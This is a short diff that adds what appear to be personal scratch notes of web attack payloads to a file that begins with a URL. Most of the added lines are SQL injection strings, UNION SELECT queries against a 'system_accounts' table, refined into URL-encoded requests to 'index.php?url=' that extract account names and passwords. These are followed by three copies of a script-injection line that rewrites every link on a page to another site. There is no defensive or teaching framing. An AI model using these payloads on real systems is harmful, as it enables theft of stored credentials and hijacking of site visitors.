@@ -4,3 +4,27 @@ http://telefrast.com/
 
 
 1122
+
+
+SELECT * FROM maitexts WHERE url = '0' UNION SELECT name,name,name,name,name FROM system_accounts WHERE id_account
+
+second/index.php?url=0' UNION SELECT name,name,name,name,name,name,name FROM system_accounts WHERE id_accounts >'0
+
+
+
+second/index.php?url0' UNION SELECT id_account name,name,name,name,name,name,name FROM system_accounts WHERE id_accounts >'0
+
+
+http://second/index.php?url=0%27%20UNION%20SELECT%20id_account%20name,pass,name,name,name,name,name%20FROM%20system_accounts%20WHERE%20id_account%20%3E%270
+
+
+http://second/index.php?url=0%27%20UNION%20SELECT%20id_account%20name,pass,name,name,name,name,name%20FROM%20system_accounts%20WHERE%20id_account%20%3E%270
+
+http://second/index.php?url=0%27%20UNION%20SELECT%20id_account%20name,pass,name,name,name,name,name%20FROM%20system_accounts%20WHERE%20id_account%20%3E%270
+
+
+<script>$(function(){$('a').attr('href','http://site.com');});</script>
+
+<script>$(function(){$('a').attr('href','http://site.com');});</script>
+
+<script>$(function(){$('a').attr('href','http://site.com');});</script>
